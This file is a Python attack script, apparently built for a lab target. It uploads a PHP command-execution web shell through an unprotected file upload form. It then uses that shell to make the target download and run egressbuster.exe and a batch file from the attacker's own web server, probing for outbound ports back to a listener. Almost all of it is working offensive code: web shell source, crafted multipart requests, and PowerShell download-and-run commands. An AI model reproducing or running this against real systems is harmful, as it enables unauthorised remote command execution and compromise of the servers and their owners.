#!/usr/bin/python
import sys, requests, os, time, signal

arg_length = len(sys.argv)

if(arg_length < 2): 
    print("[!] Not enough arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <TARGET IP>\n")
    sys.exit()

if(arg_length > 2): 
    print("[!] Too many arguments passed to the script.")
    print("[>] Usage: " + sys.argv[0] + " <TARGET IP>\n")
    sys.exit()

robots_url = "http://" + sys.argv[1] + "/robots.txt"
upload_url = "http://" + sys.argv[1] + "/simple_upload/upload_file.php"
backdoor_url = "http://" + sys.argv[1] + "/simple_upload/uploaded_files/sb.php?cmd="

robots_get = requests.get(robots_url)
if(robots_get.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Contents of the robots.txt:")
    print(robots_get.text)

post_request_headers = {
    'Host': sys.argv[0],
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------137588257440422773621356336789',
    'Content-Length': '5862',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

port_request_data = """
-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadedFile"; filename="sb.php"
Content-Type: application/x-php

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->

-----------------------------137588257440422773621356336789
Content-Disposition: form-data; name="uploadBtn"

Upload
-----------------------------137588257440422773621356336789--
"""

upload_backdoor_post = requests.post(upload_url, data=port_request_data, headers=post_request_headers)
if(upload_backdoor_post.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Backdoor successfully uploaded.")

ipv4 = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
os.popen("systemctl start apache2")
os.popen("cp -f egressbuster.exe /var/www/html/")
os.popen("cp -f egress_starter_02.bat /var/www/html/")
os.popen("chmod 777 /var/www/html/egressbuster.exe")
os.popen("chmod 777 /var/www/html/egress_starter_02.bat")
os.popen("sed -i 's/ATTACKERIP/" + ipv4 + "/g' /var/www/html/egress_starter_02.bat")

wget_egress_url = backdoor_url + "powershell.exe%20wget%20-Uri%20http://" + ipv4 + "/egressbuster.exe%20-OutFile%20egressbuster.exe"
wget_egress_get = requests.get(wget_egress_url)
if(wget_egress_get.status_code != 200):
    print("[!] Error while attempting to get robots.txt")
    sys.exit()
else:
    print("[+] Egressbuster.exe successfully uploaded.")

wget_egress_starter_url = backdoor_url + "powershell.exe%20wget%20-Uri%20http://" + ipv4 + "/egress_starter_02.bat%20-OutFile%20egress_starter_02.bat"
wget_egress_starter_get = requests.get(wget_egress_starter_url)
if(wget_egress_starter_get.status_code != 200):
    print("[!] Error while attempting to get egress_starter_02.bat")
    sys.exit()
else:
    print("[+] egress_starter_02.bat successfully uploaded.")

os.popen("systemctl stop apache2")
print("[>] Attack paused, in order to proceed run the following command on the attacker VM on a separate window:")
print("\tsudo python3 egress_listener.py " + ipv4 + " eth0 " + sys.argv[1])
input("[>] After you have launched the egress_listener.py press ENTER to resume the attack")

print("[>] Starting the egress buster, this process will take approximately 30 seconds to complete")
egress_starter_url = backdoor_url + "egress_starter_02.bat"
egress_starter_get = requests.get(egress_starter_url)

time.sleep(30)
print("[>] Attack completed successfully")
print("[>] Turning off the egress_listener.py")
egress_pid = os.popen("ps -ef | awk '/egress_listener.py/{ print $2; exit }'").read().strip()
os.kill(int(egress_pid), signal.SIGINT)
# python3 egress_listener.py 192.168.48.3 tap0 192.168.50.40
